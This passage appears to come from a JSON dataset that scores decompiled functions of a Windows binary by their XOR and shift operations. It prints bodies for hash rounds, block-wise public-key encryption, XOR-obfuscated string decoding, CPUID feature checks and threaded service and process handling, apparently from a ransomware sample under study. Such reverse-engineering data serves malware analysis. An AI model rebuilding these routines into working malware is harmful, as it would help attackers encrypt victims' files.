^ __ROR4__(v81, 13));\n    v3 = v87;\n    v9 = v21 + (v81 & v85 | v86 & (v81 | v85));\n    v83 = v9;\n    if ( v10 >= 16 )\n      break;\n    v2 = v82;\n  }\n  v22 = 64;\n  v89 = 64;\n  do\n  {\n    v23 = *(int *)((char *)v75 + v22);\n    v24 = (char *)&v75[13] + v22;\n    v25 = *(int *)((char *)&v75[13] + v22);\n    v80 = v24;\n    v26 = ((v23 >> 3) ^ __ROR4__(v23, 7) ^ __ROL4__(v23, 14)) + ((v25 >> 10) ^ __ROL4__(v25, 13) ^ __ROL4__(v25, 15));\n    v27 = v82;\n    v28 = v82;\n    v29 = *((_DWORD *)v24 - 5) + *((_DWORD *)v24 - 14) + v26;\n    *(int *)((char *)&v75[15] + v89) = v29;\n    v77 = v29;\n    v30 = *((_DWORD *)v24 - 12);\n    v31 = v84\n        + v29\n        + *(int *)((char *)dword_417810 + v89)\n        + (v88 ^ v27 & (v88 ^ v87))\n        + (__ROR4__(v27, 6) ^ __ROL4__(v28, 7) ^ __ROR4__(v28, 11));\n    v86 += v31;\n    v84 = v31 + (__ROR4__(v83, 2) ^ __ROL4__(v83, 10) ^ __ROR4__(v83, 13)) + (v85 & (v83 | v81) | v83 & v81);\n    v32 = v84;\n    v33 = *((_DWORD *)v80 - 4)\n        + ((v30 >> 3) ^ __ROR4__(v30, 7) ^ __ROL4__(v30, 14))\n        + ((*((_DWORD *)v80 + 1) >> 10) ^ __ROL4__(*((_DWORD *)v80 + 1), 13) ^ __ROL4__(*((_DWORD *)v80 + 1), 15))\n        + v23;\n    v34 = v86;\n    *(int *)((char *)&v75[16] + v89) = v33;\n    v35 = v88\n        + v33\n        + *(int *)((char *)dword_417814 + v89)\n        + (v87 ^ v34 & (v82 ^ v87))\n        + (__ROR4__(v34, 6) ^ __ROL4__(v34, 7) ^ __ROR4__(v34, 11));\n    v85 += v35;\n    v88 = v35 + (__ROR4__(v32, 2) ^ __ROL4__(v32, 10) ^ __ROR4__(v32, 13)) + (v81 & (v83 | v32) | v83 & v84);\n    v36 = *(int *)((char *)&v75[2] + v89);\n    v37 = v30\n        + *(int *)((char *)&v75[10] + v89)\n        + ((v77 >> 10) ^ __ROL4__(v77, 13) ^ __ROL4__(v77, 15))\n        + ((v36 >> 3) ^ __ROR4__(v36, 7) ^ __ROL4__(v36, 14));\n    v38 = v85;\n    *(int *)((char *)&v75[17] + v89) = v37;\n    v79 = v37;\n    v39 = v87\n        + v37\n        + *(int *)((char *)dword_417818 + v89)\n        + (v82 ^ v38 & (v82 ^ v86))\n        + (__ROR4__(v38, 6) ^ __ROL4__(v38, 7) ^ __ROR4__(v38, 11));\n    v81 += v39;\n    v87 = v39 + (__ROR4__(v88, 2) ^ __ROL4__(v88, 10) ^ __ROR4__(v88, 13)) + (v84 & v88 | v83 & (v84 | v88));\n    v40 = *(int *)((char *)&v75[3] + v89);\n    v41 = (v33 >> 10) ^ __ROL4__(v33, 13) ^ __ROL4__(v33, 15);\n    v42 = v81;\n    v43 = v41 + ((v40 >> 3) ^ __ROR4__(v40, 7) ^ __ROL4__(v40, 14));\n    v44 = __ROR4__(v81, 11);\n    v45 = v36 + *(int *)((char *)&v75[11] + v89) + v43;\n    v46 = v87;\n    *(int *)((char *)&v75[18] + v89) = v45;\n    v78 = v45;\n    v47 = v82\n        + v45\n        + *(int *)((char *)dword_41781C + v89)\n        + (v86 ^ v42 & (v86 ^ v85))\n        + (__ROR4__(v42, 6) ^ __ROL4__(v42, 7) ^ v44);\n    v83 += v47;\n    v82 = v47 + (__ROR4__(v46, 2) ^ __ROL4__(v46, 10) ^ __ROR4__(v46, 13)) + (v88 & v46 | v84 & (v88 | v46));\n    v48 = *(int *)((char *)&v75[4] + v89);\n    v49 = v83;\n    v50 = __ROR4__(v83, 11);\n    v51 = v40\n        + *(int *)((char *)&v75[12] + v89)\n        + ((v48 >> 3) ^ __ROR4__(v48, 7) ^ __ROL4__(v48, 14))\n        + ((v79 >> 10) ^ __ROL4__(v79, 13) ^ __ROL4__(v79, 15));\n    v52 = v82;\n    *(int *)((char *)&v75[19] + v89) = v51;\n    v79 = v51;\n    v53 = v86\n        + v51\n        + *(int *)((char *)dword_417820 + v89)\n        + (v85 ^ v49 & (v81 ^ v85))\n        + (__ROR4__(v49, 6) ^ __ROL4__(v49, 7) ^ v50);\n    v84 += v53;\n    v86 = v53 + (__ROR4__(v52, 2) ^ __ROL4__(v52, 10) ^ __ROR4__(v52, 13)) + (v88 & (v52 | v87) | v52 & v87);\n    v54 = *(int *)((char *)&v75[5] + v89);\n    v55 = v48\n        + *(int *)((char *)&v75[13] + v89)\n        + ((v54 >> 3) ^ __ROR4__(v54, 7) ^ __ROL4__(v54, 14))\n        + ((v78 >> 10) ^ __ROL4__(v78, 13) ^ __ROL4__(v78, 15));\n    v56 = v84;\n    *(int *)((char *)&v75[20] + v89) = v55;\n    v78 = v55;\n    v57 = v85\n        + v55\n        + *(int *)((char *)dword_417824 + v89)\n        + (v81 ^ v56 & (v83 ^ v81))\n        + (__ROR4__(v56, 6) ^ __ROL4__(v56, 7) ^ __ROR4__(v56, 11));\n    v88 += v57;\n    v85 = v57 + (__ROR4__(v86, 2) ^ __ROL4__(v86, 10) ^ __ROR4__(v86, 13)) + (v87 & (v82 | v86) | v82 & v86);\n    v58 = *((_DWORD *)v80 - 7);\n    v59 = v54 + ((v79 >> 10) ^ __ROL4__(v79, 13) ^ __ROL4__(v79, 15));\n    v60 = v88;\n    v61 = *((_DWORD *)v80 + 1) + v59 + ((v58 >> 3) ^ __ROR4__(v58, 7) ^ __ROL4__(v58, 14));\n    v62 = __ROR4__(v88, 11);\n    *(int *)((char *)&v75[21] + v89) = v61;\n    v63 = (v83 ^ v60 & (v84 ^ v83)) + (__ROR4__(v60, 6) ^ __ROL4__(v60, 7) ^ v62);\n    v64 = v82;\n    v65 = v81 + v61 + *(int *)((char *)dword_417828 + v89) + v63;\n    v87 += v65;\n    v81 = v65 + (__ROR4__(v85, 2) ^ __ROL4__(v85, 10) ^ __ROR4__(v85, 13)) + (v82 & (v86 | v85) | v86 & v85);\n    v66 = v87;\n    v67 = v58\n        + v77\n        + ((v78 >> 10) ^ __ROL4__(v78, 13) ^ __ROL4__(v78, 15))\n        + ((*((_DWORD *)v80 - 6) >> 3) ^ __ROR4__(*((_DWORD *)v80 - 6), 7) ^ __ROL4__(*((_DWORD *)v80 - 6), 14));\n    v68 = __ROR4__(v87, 11);\n    *(int *)((char *)&v75[22] + v89) = v67;\n    v69 = v83\n        + v67\n        + *(int *)((char *)dword_41782C + v89)\n        + (v84 ^ v66 & (v88 ^ v84))\n        + (__ROR4__(v66, 6) ^ __ROL4__(v66, 7) ^ v68);\n    v70 = v64 + v69;\n    v71 = v81;\n    v82 = v70;\n    v72 = v69 + (__ROR4__(v81, 2) ^ __ROL4__(v81, 10) ^ __ROR4__(v81, 13));\n    v22 = v89 + 32;\n    v83 = v72 + (v86 & (v81 | v85) | v81 & v85);\n    v89 = v22;\n  }\n  while ( v22 < 0x100 );\n  a1[2] = v76 + v72 + (v86 & (v81 | v85) | v81 & v85);\n  a1[4] += v85;\n  a1[5] += v86;\n  a1[7] += v87;\n  a1[3] += v71;\n  a1[8] += v88;\n  v73 = v84;\n  a1[6] += v70;\n  a1[9] += v73;\n  return 0;\n}\n// 417810: using guessed type int dword_417810[];\n// 417814: using guessed type int dword_417814[];\n// 417818: using guessed type int dword_417818[];\n// 41781C: using guessed type int dword_41781C[];\n// 417820: using guessed type int dword_417820[];\n// 417824: using guessed type int dword_417824[];\n// 417828: using guessed type int dword_417828[];\n// 41782C: using guessed type int dword_41782C[];\n\n"
    },
    {
        "Function": "sub_4046C0",
        "Total XOR and shift operations": 2,
        "XOR operations": 0,
        "Shift operations": 2,
        "Operation percentage": "20.00%",
        "Function Body": "\nint __cdecl sub_4046C0(int a1, unsigned int a2)\n{\n  if ( 32 * *(_DWORD *)(a1 + 4) > a2 )\n    return (*(_DWORD *)(*(_DWORD *)(a1 + 8) + 4 * (a2 >> 5)) >> (a2 & 0x1F)) & 1;\n  else\n    return 0;\n}\n\n"
    },
    {
        "Function": "sub_401020",
        "Total XOR and shift operations": 1,
        "XOR operations": 1,
        "Shift operations": 0,
        "Operation percentage": "14.29%",
        "Function Body": "\nchar __thiscall sub_401020(_BYTE *this, char a2)\n{\n  return a2 ^ *this;\n}\n\n"
    },
    {
        "Function": "sub_4056A0",
        "Total XOR and shift operations": 1,
        "XOR operations": 0,
        "Shift operations": 1,
        "Operation percentage": "14.29%",
        "Function Body": "\nunsigned int __cdecl sub_4056A0(int a1)\n{\n  return (sub_402FC0(a1) + 7) >> 3;\n}\n\n"
    },
    {
        "Function": "sub_4012C0",
        "Total XOR and shift operations": 5,
        "XOR operations": 0,
        "Shift operations": 5,
        "Operation percentage": "12.82%",
        "Function Body": "\nunsigned int __stdcall sub_4012C0(unsigned __int64 a1, __int64 a2)\n{\n  unsigned __int64 v3; // rtt\n  unsigned int v4; // ecx\n  unsigned int v5; // ebx\n  unsigned __int64 v6; // rax\n  char v7; // cf\n  unsigned int v8; // esi\n  unsigned __int64 v9; // rax\n\n  if ( HIDWORD(a2) )\n  {\n    v4 = HIDWORD(a2);\n    v5 = a2;\n    v6 = a1;\n    do\n    {\n      v7 = v4 & 1;\n      v4 >>= 1;\n      v5 = (v5 >> 1) | (v7 << 31);\n      v6 >>= 1;\n    }\n    while ( v4 );\n    v8 = v6 / v5;\n    v9 = v8 * (unsigned __int64)(unsigned int)a2;\n    if ( __CFADD__(HIDWORD(a2) * v8, HIDWORD(v9)) || (HIDWORD(v9) = (a2 * (unsigned __int64)v8) >> 32, v9 > a1) )\n      --v8;\n    return v8;\n  }\n  else\n  {\n    LODWORD(v3) = a1;\n    HIDWORD(v3) = HIDWORD(a1) % (unsigned int)a2;\n    return v3 / (unsigned int)a2;\n  }\n}\n\n"
    },
    {
        "Function": "sub_4120A0",
        "Total XOR and shift operations": 6,
        "XOR operations": 0,
        "Shift operations": 6,
        "Operation percentage": "7.41%",
        "Function Body": "\nint __fastcall sub_4120A0(char *Src, int *a2)\n{\n  int v4; // edx\n  int v5; // esi\n  size_t v6; // ebx\n  unsigned int v7; // eax\n  unsigned int v8; // edx\n  int v10[130]; // [esp+10h] [ebp-3D8h] BYREF\n  char v11[320]; // [esp+218h] [ebp-1D0h] BYREF\n  BYTE pbBuffer[104]; // [esp+358h] [ebp-90h] BYREF\n  int v13[3]; // [esp+3C0h] [ebp-28h] BYREF\n  int v14[3]; // [esp+3CCh] [ebp-1Ch] BYREF\n  int v15; // [esp+3D8h] [ebp-10h]\n  int *v16; // [esp+3DCh] [ebp-Ch]\n  int v17; // [esp+3E0h] [ebp-8h]\n  unsigned int v18; // [esp+3E4h] [ebp-4h]\n\n  v15 = 0;\n  v16 = a2;\n  sub_404760(v14);\n  sub_404760(v13);\n  sub_406A50(dword_41D220, 0, 0);\n  if ( !sub_405360((int)v14, ::Src, 0x100u)\n    && !sub_405360((int)v13, &unk_41B100, 3u)\n    && !sub_4069A0((int)dword_41D220, (int)v14, 0, 0, 0, (int)v13) )\n  {\n    sub_401970(v11);\n    sub_401610(v10);\n    sub_40A5A0(pbBuffer, 0x64u);\n    if ( !sub_401B70(v11, (int)sub_4014E0, (int)v10, pbBuffer, 0x64u) )\n    {\n      v4 = (unsigned __int64)(1121950641i64 * *a2) >> 32;\n      v5 = 0;\n      v18 = *a2;\n      v6 = 245;\n      v17 = 0;\n      if ( (v4 >> 6) + ((unsigned int)v4 >> 31) + 1 )\n      {\n        while ( !sub_406A80(\n                   dword_41D220,\n                   (void (__cdecl *)(int, unsigned int, unsigned int))sub_401990,\n                   (int)v11,\n                   0,\n                   v6,\n                   Src,\n                   (char *)&Data[v5]) )\n        {\n          v7 = v18;\n          if ( v18 >= 0xF5 )\n            v7 = v6;\n          v6 = v7;\n          v18 -= 245;\n          Src += 245;\n          v8 = (int)((unsigned __int64)(1121950641i64 * *v16) >> 32) >> 6;\n          v5 += 256;\n          if ( ++v17 == v8 + (v8 >> 31) + 1 )\n            goto LABEL_10;\n        }\n      }\n      else\n      {\nLABEL_10:\n        v15 = 1;\n        *v16 = v5;\n      }\n    }\n  }\n  sub_404050((int)v14);\n  sub_404050((int)v13);\n  sub_406620((int)dword_41D220);\n  sub_401940(v11);\n  sub_4014A0(v10);\n  return v15;\n}\n// 41B000: using guessed type BYTE Src[256];\n// 41CA90: using guessed type BYTE Data[1280];\n// 41D220: using guessed type int dword_41D220[43];\n// 4120A0: using guessed type char var_1D0[320];\n\n"
    },
    {
        "Function": "sub_402F10",
        "Total XOR and shift operations": 1,
        "XOR operations": 0,
        "Shift operations": 1,
        "Operation percentage": "6.67%",
        "Function Body": "\nint __cdecl sub_402F10(_DWORD *a1, int *a2, int a3)\n{\n  int v3; // ecx\n  int v5[3]; // [esp+0h] [ebp-Ch] BYREF\n\n  v3 = a3 >> 31;\n  v5[1] = 1;\n  a3 = abs32(a3);\n  v5[2] = (int)&a3;\n  v5[0] = (v3 & 0xFFFFFFFE) + 1;\n  return sub_402F50(a1, a2, v5);\n}\n\n"
    },
    {
        "Function": "sub_412730",
        "Total XOR and shift operations": 6,
        "XOR operations": 4,
        "Shift operations": 2,
        "Operation percentage": "4.48%",
        "Function Body": "\nint sub_412730()\n{\n  int v5; // ecx\n  int v6; // eax\n  unsigned int v12; // ecx\n  int v18; // ecx\n  int v19; // eax\n  unsigned int v25; // ecx\n  HANDLE IoCompletionPort; // eax\n  unsigned int v27; // ecx\n  HANDLE (__stdcall *v28)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD); // esi\n  HANDLE v29; // ebx\n  HANDLE v30; // edi\n  DWORD v32; // [esp+10h] [ebp-58h]\n  DWORD ThreadId; // [esp+14h] [ebp-54h] BYREF\n  CHAR v34[16]; // [esp+18h] [ebp-50h] BYREF\n  _DWORD v35[3]; // [esp+28h] [ebp-40h] BYREF\n  SYSTEMTIME SystemTime; // [esp+34h] [ebp-34h] BYREF\n  struct _SYSTEM_INFO SystemInfo; // [esp+44h] [ebp-24h] BYREF\n\n  _EAX = 0;\n  __asm { cpuid }\n  *(_DWORD *)v34 = _EAX;\n  *(_DWORD *)&v34[4] = _EBX;\n  *(_DWORD *)&v34[8] = _ECX;\n  *(_DWORD *)&v34[12] = _EDX;\n  if ( _EAX >= 1 )\n  {\n    v5 = 1;\n    v6 = 1;\n    if ( *(_DWORD *)&v34[4] != 1970169159 || *(_DWORD *)&v34[12] != 1231384169 || *(_DWORD *)&v34[8] != 1818588270 )\n      v5 = 0;\n    if ( *(_DWORD *)&v34[4] != 1752462657 || *(_DWORD *)&v34[12] != 1769238117 || *(_DWORD *)&v34[8] != 1145913699 )\n      v6 = 0;\n    if ( v5 || v6 )\n    {\n      _EAX = 1;\n      __asm { cpuid }\n      *(_DWORD *)v34 = _EAX;\n      *(_DWORD *)&v34[4] = _EBX;\n      *(_DWORD *)&v34[8] = _ECX;\n      *(_DWORD *)&v34[12] = _EDX;\n      if ( (_ECX & 0x2000000) != 0 )\n      {\n        v12 = 0;\n        *(_OWORD *)v34 = xmmword_4194D0;\n        v35[0] = 1565677852;\n        strcpy((char *)&v35[1], \"^PYX\");\n        do\n          v34[++v12] ^= v34[0];\n        while ( v12 < 0x17 );\n        LOBYTE(v35[2]) = 0;\n        sub_4100C0(&v34[1]);\n        dword_41D32C = 1;\n      }\n    }\n  }\n  _EAX = 0;\n  __asm { cpuid }\n  *(_DWORD *)v34 = _EAX;\n  *(_DWORD *)&v34[4] = _EBX;\n  *(_DWORD *)&v34[8] = _ECX;\n  v18 = 1;\n  *(_DWORD *)&v34[12] = _EDX;\n  v19 = 1;\n  if ( _EBX != 1970169159 || *(_DWORD *)&v34[12] != 1231384169 || *(_DWORD *)&v34[8] != 1818588270 )\n    v18 = 0;\n  if ( *(_DWORD *)&v34[4] != 1752462657 || *(_DWORD *)&v34[12] != 1769238117 || *(_DWORD *)&v34[8] != 1145913699 )\n    v19 = 0;\n  if ( v18 || v19 )\n  {\n    _EAX = 1;\n    __asm { cpuid }\n    *(_DWORD *)v34 = _EAX;\n    *(_DWORD *)&v34[4] = _EBX;\n    *(_DWORD *)&v34[8] = _ECX;\n    *(_DWORD *)&v34[12] = _EDX;\n    if ( (_ECX & 0x40000000) != 0 )\n    {\n      v25 = 0;\n      *(_OWORD *)v34 = xmmword_419400;\n      strcpy((char *)v35, \"`%.!\\\",%$\");\n      do\n        v34[++v25] ^= v34[0];\n      while ( v25 < 0x17 );\n      LOBYTE(v35[2]) = 0;\n      sub_4100C0(&v34[1]);\n      dword_41D334 = 1;\n    }\n  }\n  sub_411790();\n  GetSystemInfo(&SystemInfo);\n  NumberOfConcurrentThreads = 2 * SystemInfo.dwNumberOfProcessors;\n  IoCompletionPort = CreateIoCompletionPort((HANDLE)0xFFFFFFFF, 0, 0, 2 * SystemInfo.dwNumberOfProcessors);\n  v27 = 0;\n  ExistingCompletionPort = IoCompletionPort;\n  *(_OWORD *)v34 = xmmword_419720;\n  strcpy((char *)v35, \"GPTQF\\x1B\\x1B\\x1B\");\n  do\n    v34[++v27] ^= v34[0];\n  while ( v27 < 0x17 );\n  LOBYTE(v35[2]) = 0;\n  sub_4100C0(&v34[1]);\n  v32 = 0;\n  if ( SystemInfo.dwNumberOfProcessors )\n  {\n    v28 = CreateThread;\n    do\n    {\n      v29 = v28(0, 0, (LPTHREAD_START_ROUTINE)sub_410E30, 0, 0, &ThreadId);\n      v30 = v28(0, 0, (LPTHREAD_START_ROUTINE)sub_410E30, 0, 0, &ThreadId);\n      SetThreadAffinityMask(v29, 1 << v32);\n      SetThreadAffinityMask(v30, 1 << v32);\n      v28 = CreateThread;\n      ++v32;\n    }\n    while ( v32 < SystemInfo.dwNumberOfProcessors );\n  }\n  *(_DWORD *)&SystemTime.wYear = 67536;\n  *(_DWORD *)&SystemTime.wDay = 65537;\n  *(_DWORD *)&SystemTime.wMinute = 65537;\n  SystemTime.wDayOfWeek = 1;\n  SystemTime.wMilliseconds = 1;\n  SystemTimeToFileTime(&SystemTime, &FileTime);\n  return 1;\n}\n// 419400: using guessed type __int128 xmmword_419400;\n// 4194D0: using guessed type __int128 xmmword_4194D0;\n// 419720: using guessed type __int128 xmmword_419720;\n// 41D32C: using guessed type int dword_41D32C;\n// 41D334: using guessed type int dword_41D334;\n\n"
    },
    {
        "Function": "sub_40A8B0",
        "Total XOR and shift operations": 52,
        "XOR operations": 52,
        "Shift operations": 0,
        "Operation percentage": "3.45%",
        "Function Body": "\nULONG __stdcall sub_40A8B0(PVOID Parameter)\n{\n  char v1; // dl\n  int v2; // ecx\n  unsigned int v3; // ecx\n  unsigned int v4; // ecx\n  char v5; // dl\n  int v6; // ecx\n  unsigned int v7; // ecx\n  unsigned int v8; // ecx\n  unsigned int v9; // ecx\n  unsigned int v10; // ecx\n  unsigned int v11; // ecx\n  char v12; // dl\n  unsigned int v13; // ecx\n  unsigned int v14; // ecx\n  unsigned int v15; // ecx\n  unsigned int v16; // ecx\n  unsigned int v17; // ecx\n  unsigned int v18; // ecx\n  unsigned int v19; // ecx\n  unsigned int v20; // ecx\n  unsigned int v21; // ecx\n  unsigned int v22; // ecx\n  unsigned int v23; // ecx\n  unsigned int v24; // ecx\n  unsigned int v25; // ecx\n  char v26; // dl\n  unsigned int v27; // ecx\n  int v28; // esi\n  SC_HANDLE v29; // edi\n  void (__stdcall *v30)(SC_HANDLE); // edi\n  unsigned int v31; // ecx\n  DWORD v32; // edx\n  unsigned int v33; // ecx\n  unsigned int v34; // ecx\n  unsigned int v35; // ecx\n  char v36; // dl\n  unsigned int v37; // ecx\n  char v38; // dl\n  int v39; // ecx\n  unsigned int v40; // ecx\n  char v41; // dl\n  unsigned int v42; // ecx\n  unsigned int v43; // ecx\n  unsigned int v44; // ecx\n  unsigned int v45; // ecx\n  unsigned int v46; // ecx\n  char v47; // dl\n  int v48; // ecx\n  char v49; // dl\n  int v50; // ecx\n  unsigned int v51; // ecx\n  unsigned int v52; // ecx\n  unsigned int v53; // ecx\n  unsigned int v54; // ecx\n  int v55; // esi\n  int v56; // edi\n  unsigned int v57; // eax\n  unsigned int v58; // ecx\n  HMODULE ModuleHandleA; // eax\n  FARPROC ProcAddress; // eax\n  unsigned int v61; // ecx\n  unsigned int v62; // ecx\n  unsigned int v63; // ecx\n  unsigned int v64; // esi\n  char *v65; // esi\n  unsigned int v66; // esi\n  char *v67; // esi\n  unsigned int v68; // esi\n  char *v69; // esi\n  unsigned int v70; // esi\n  char *v71; // esi\n  unsigned int v72; // esi\n  char *v73; // esi\n  unsigned int v74; // esi\n  char *v75; // esi\n  SC_HANDLE v76; // eax\n  int v77; // esi\n  void *v78; // eax\n  bool v79; // zf\n  unsigned int v80; // edi\n  char *v81; // eax\n  char *v82; // esi\n  const CHAR *v83; // eax\n  unsigned int v84; // edi\n  char *v85; // eax\n  char *v86; // esi\n  unsigned int v87; // edi\n  char *v88; // eax\n  char *v89; // esi\n  const CHAR *v90; // eax\n  HMODULE v91; // eax\n  FARPROC v92; // eax\n  SC_HANDLE v94; // [esp-4h] [ebp-BF4h]\n  LPCSTR v95; // [esp-4h] [ebp-BF4h]\n  SC_HANDLE v96; // [esp-4h] [ebp-BF4h]\n  LPCSTR v97; // [esp-4h] [ebp-BF4h]\n  LPCSTR v98; // [esp-4h] [ebp-BF4h]\n  const CHAR *v99; // [esp-4h] [ebp-BF4h]\n  HANDLE hSnapshot; // [esp+10h] [ebp-BE0h]\n  HANDLE hSnapshota; // [esp+10h] [ebp-BE0h]\n  HANDLE hSnapshotb; // [esp+10h] [ebp-BE0h]\n  HANDLE hSnapshotc; // [esp+10h] [ebp-BE0h]\n  HANDLE hSnapshotd; // [esp+10h] [ebp-BE0h]\n  HANDLE hSnapshote; // [esp+10h] [ebp-BE0h]\n  HANDLE hSnapshotf; // [esp+10h] [ebp-BE0h]\n  HANDLE hSnapshotg; // [esp+10h] [ebp-BE0h]\n  SC_HANDLE hSCManager; // [esp+14h] [ebp-BDCh]\n  char hSCManagerb; // [esp+14h] [ebp-BDCh]\n  char hSCManagerc; // [esp+14h] [ebp-BDCh]\n  char hSCManagerd; // [esp+14h] [ebp-BDCh]\n  char hSCManagere; // [esp+14h] [ebp-BDCh]\n  char hSCManagerf; // [esp+14h] [ebp-BDCh]\n  char hSCManagerg; // [esp+14h] [ebp-BDCh]\n  SC_HANDLE hSCManagera; // [esp+14h] [ebp-BDCh]\n  char v116; // [esp+1Bh] [ebp-BD5h] BYREF\n  char v117[9]; // [esp+1Ch] [ebp-BD4h] BYREF\n  char v118; // [esp+25h] [ebp-BCBh] BYREF\n  char v119[22]; // [esp+26h] [ebp-BCAh] BYREF\n  char v120; // [esp+3Ch] [ebp-BB4h] BYREF\n  char v121[24]; // [esp+3Dh] [ebp-BB3h] BYREF\n  char v122; // [esp+55h] [ebp-B9Bh] BYREF\n  char v123[27]; // [esp+56h] [ebp-B9Ah] BYREF\n  char v124; // [esp+71h] [ebp-B7Fh] BYREF\n  char v125[30]; // [esp+72h] [ebp-B7Eh] BYREF\n  char v126; // [esp+90h] [ebp-B60h] BYREF\n  char v127[34]; // [esp+91h] [ebp-B5Fh] BYREF\n  char v128; // [esp+B3h] [ebp-B3Dh] BYREF\n  char v129[37]; // [esp+B4h] [ebp-B3Ch] BYREF\n  char v130; // [esp+D9h] [ebp-B17h] BYREF\n  char v131[48]; // [esp+DAh] [ebp-B16h] BYREF\n  __int16 v132; // [esp+10Ah] [ebp-AE6h]\n  void *v133; // [esp+10Ch] [ebp-AE4h]\n  _BYTE v134[18]; // [esp+111h] [ebp-ADFh] BYREF\n  char v135[19]; // [esp+123h] [ebp-ACDh] BYREF\n  char v136[19]; // [esp+136h] [ebp-ABAh] BYREF\n  char v137[9]; // [esp+149h] [ebp-AA7h] BYREF\n  char v138[9]; // [esp+152h] [ebp-A9Eh] BYREF\n  char v139[8]; // [esp+15Bh] [ebp-A95h] BYREF\n  char v140[19]; // [esp+163h] [ebp-A8Dh] BYREF\n  char v141[9]; // [esp+176h] [ebp-A7Ah] BYREF\n  char v142[9]; // [esp+17Fh] [ebp-A71h] BYREF\n  char v143[19]; // [esp+188h] [ebp-A68h] BYREF\n  char v144[7]; // [esp+19Bh] [ebp-A55h] BYREF\n  char v145[10]; // [esp+1A2h] [ebp-A4Eh] BYREF\n  char v146[11]; // [esp+1ACh] [ebp-A44h] BYREF\n  char v147[7]; // [esp+1B7h] [ebp-A39h] BYREF\n  char v148[10]; // [esp+1BEh] [ebp-A32h] BYREF\n  char v149[11]; // [esp+1C8h] [ebp-A28h] BYREF\n  char v150[20]; // [esp+1D3h] [ebp-A1Dh] BYREF\n  _BYTE v151[19]; // [esp+1E7h] [ebp-A09h] BYREF\n  _BYTE v152[20]; // [esp+1FAh] [ebp-9F6h] BYREF\n  _BYTE v153[20]; // [esp+20Eh] [ebp-9E2h] BYREF\n  char v154[18]; // [esp+222h] [ebp-9CEh] BYREF\n  char v155[12]; // [esp+234h] [ebp-9BCh] BYREF\n  char v156[21]; // [esp+240h] [ebp-9B0h] BYREF\n  char v157[11]; // [esp+255h] [ebp-99Bh] BYREF\n  char v158[11]; // [esp+260h] [ebp-990h] BYREF\n  char v159[11]; // [esp+26Bh] [ebp-985h] BYREF\n  char v160[11]; // [esp+276h] [ebp-97Ah] BYREF\n  char v161[11]; // [esp+281h] [ebp-96Fh] BYREF\n  char v162[11]; // [esp+28Ch] [ebp-964h] BYREF\n  char v163[7]; // [esp+297h] [ebp-959h] BYREF\n  char v164[12]; // [esp+29Eh] [ebp-952h] BYREF\n  char v165[12]; // [esp+2AAh] [ebp-946h] BYREF\n  char v166[13]; // [esp+2B6h] [ebp-93Ah] BYREF\n  _BYTE v167[19]; // [esp+2C3h] [ebp-92Dh] BYREF\n  char v168[20]; // [esp+2D6h] [ebp-91Ah] BYREF\n  char v169[6]; // [esp+2EAh] [ebp-906h] BYREF\n  _DWORD v170[3]; // [esp+2F0h] [ebp-900h] BYREF\n  char v171; // [esp+2FCh] [ebp-8F4h]\n  char v172[13]; // [esp+2FDh] [ebp-8F3h] BYREF\n  char v173[14]; // [esp+30Ah] [ebp-8E6h] BYREF\n  char v174[7]; // [esp+318h] [ebp-8D8h] BYREF\n  char v175[7]; // [esp+31Fh] [ebp-8D1h] BYREF\n  char v176[7]; // [esp+326h] [ebp-8CAh] BYREF\n  char v177[7]; // [esp+32Dh] [ebp-8C3h] BYREF\n  char v178[7]; // [esp+334h] [ebp-8BCh] BYREF\n  _DWORD v179[3]; // [esp+33Bh] [ebp-8B5h] BYREF\n  __int16 v180; // [esp+347h] [ebp-8A9h]\n  int v181[3]; // [esp+349h] [ebp-8A7h] BYREF\n  __int16 v182; // [esp+355h] [ebp-89Bh]\n  char v183[15]; // [esp+357h] [ebp-899h] BYREF\n  char v184[15]; // [esp+366h] [ebp-88Ah] BYREF\n  int v185; // [esp+375h] [ebp-87Bh] BYREF\n  char v186[11]; // [esp+379h] [ebp-877h] BYREF\n  void *v187; // [esp+384h] [ebp-86Ch]\n  __int128 v188; // [esp+38Bh] [ebp-865h] BYREF\n  int v189; // [esp+39Bh] [ebp-855h]\n  _BYTE v190[7]; // [esp+39Fh] [ebp-851h] BYREF\n  char v191; // [esp+3A6h] [ebp-84Ah]\n  char v192; // [esp+3A7h] [ebp-849h]\n  char v193; // [esp+3A8h] [ebp-848h]\n  char v194; // [esp+3A9h] [ebp-847h]\n  char v195; // [esp+3AAh] [ebp-846h]\n  char v196; // [esp+3ABh] [ebp-845h]\n  char v197; // [esp+3ACh] [ebp-844h]\n  char v198; // [esp+3ADh] [ebp-843h]\n  __int16 v199; // [esp+3AEh] [ebp-842h]\n  int v200; // [esp+3B0h] [ebp-840h] BYREF\n  DWORD pcbBytesNeeded; // [esp+3B4h] [ebp-83Ch] BYREF\n  __int128 v202; // [esp+3B8h] [ebp-838h] BYREF\n  int v203; // [esp+3C8h] [ebp-828h]\n  int v204; // [esp+3CCh] [ebp-824h]\n  int v205; // [esp+3D0h] [ebp-820h]\n  __int16 v206; // [esp+3D4h] [ebp-81Ch]\n  char v207; // [esp+3D6h] [ebp-81Ah]\n  CHAR v208[16]; // [esp+3D7h] [ebp-819h] BYREF\n  char v209[15]; // [esp+3E7h] [ebp-809h] BYREF\n  __int128 v210; // [esp+3F6h] [ebp-7FAh] BYREF\n  int v211; // [esp+406h] [ebp-7EAh]\n  int v212; // [esp+40Ah] [ebp-7E6h]\n  int v213; // [esp+40Eh] [ebp-7E2h]\n  __int128 v214; // [esp+412h] [ebp-7DEh] BYREF\n  char v215[11]; // [esp+422h] [ebp-7CEh] BYREF\n  __int128 v216; // [esp+42Dh] [ebp-7C3h] BYREF\n  int v217; // [esp+43Dh] [ebp-7B3h]\n  int v218; // [esp+441h] [ebp-7AFh]\n  char v219; // [esp+445h] [ebp-7ABh]\n  __int128 v220; // [esp+446h] [ebp-7AAh] BYREF\n  int v221; // [esp+456h] [ebp-79Ah]\n  int v222; // [esp+45Ah] [ebp-796h]\n  char v223[24]; // [esp+45Eh] [ebp-792h] BYREF\n  __int128 v224; // [esp+476h] [ebp-77Ah] BYREF\n  int v225; // [esp+486h] [ebp-76Ah]\n  int v226; // [esp+48Ah] [ebp-766h]\n  __int128 v227; // [esp+48Eh] [ebp-762h] BYREF\n  int v228; // [esp+49Eh] [ebp-752h]\n  char v229[3]; // [esp+4A2h] [ebp-74Eh] BYREF\n  __int128 v230; // [esp+4A5h] [ebp-74Bh] BYREF\n  int v231; // [esp+4B5h] [ebp-73Bh]\n  char v232[3]; // [esp+4B9h] [ebp-737h] 